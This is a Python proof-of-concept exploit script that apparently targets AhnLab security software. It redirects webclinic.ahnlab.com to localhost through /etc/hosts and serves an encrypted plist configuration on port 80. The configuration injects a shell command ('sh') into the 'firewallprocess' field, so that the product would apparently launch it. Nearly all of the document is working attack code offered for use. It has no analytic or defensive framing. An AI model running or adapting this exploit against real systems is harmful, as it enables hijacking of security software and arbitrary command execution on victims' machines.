#!/usr/bin/env python3

import atexit
from http.server import BaseHTTPRequestHandler, HTTPServer

from crypto_helpers import CipherMode, DataFormat, KeyDerivationMode, encrypt_data

shellcode = "sh"

# Global variable to store encrypted data
encrypted_payload = None


class PayloadHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.end_headers()
        if encrypted_payload is not None:
            self.wfile.write(encrypted_payload)

    def log_message(self, format, *args):
        print(f"[*] {self.client_address[0]} - {format % args}")


xml = f"""
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>langid</key>
    <integer>1042</integer>
    <key>allowedprocess</key>
    <string>firefox;chrome;opera;dumbass</string>
    <key>firewallprocess</key>
    <string>{shellcode}</string>
    <key>aos_help_url</key>
    <string
      >http://help.ahnlab.com/rdir/link.do?seq=297&amp;locale=ko_kr</string
    >
  </dict>
</plist>
"""


def add_hosts_entry():
    hosts_entry = "127.0.0.1 webclinic.ahnlab.com\n"
    hosts_path = "/etc/hosts"

    # Check if entry already exists
    try:
        with open(hosts_path, "r") as f:
            content = f.read()
            if "webclinic.ahnlab.com" in content:
                print("[*] Host entry already exists")
                return
    except PermissionError:
        print("[!] Need sudo privileges to modify /etc/hosts")
        return

    # Add the entry
    try:
        with open(hosts_path, "a") as f:
            f.write(hosts_entry)
        print("[*] Added webclinic.ahnlab.com -> localhost to /etc/hosts")
    except PermissionError:
        print("[!] Need sudo privileges to modify /etc/hosts")


def remove_hosts_entry():
    hosts_path = "/etc/hosts"

    try:
        with open(hosts_path, "r") as f:
            lines = f.readlines()

        # Filter out the webclinic.ahnlab.com entry
        filtered_lines = [line for line in lines if "webclinic.ahnlab.com" not in line]

        with open(hosts_path, "w") as f:
            f.writelines(filtered_lines)

        print("[*] Removed webclinic.ahnlab.com entry from /etc/hosts")
    except PermissionError:
        print("[!] Could not clean up /etc/hosts entry")


def main():
    global encrypted_payload

    # Add hosts entry and register cleanup
    add_hosts_entry()
    atexit.register(remove_hosts_entry)

    encrypted_payload = encrypt_data(
        bytes(xml, "utf-8"),
        DataFormat.BASE64,
        KeyDerivationMode.XOR,
        CipherMode.AES_CBC,
    )

    server = HTTPServer(("0.0.0.0", 80), PayloadHandler)
    print("[*] Serving encrypted payload on http://0.0.0.0:80")
    print(f"[*] Payload size: {len(encrypted_payload)} bytes")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
        server.shutdown()


if __name__ == "__main__":
    main()
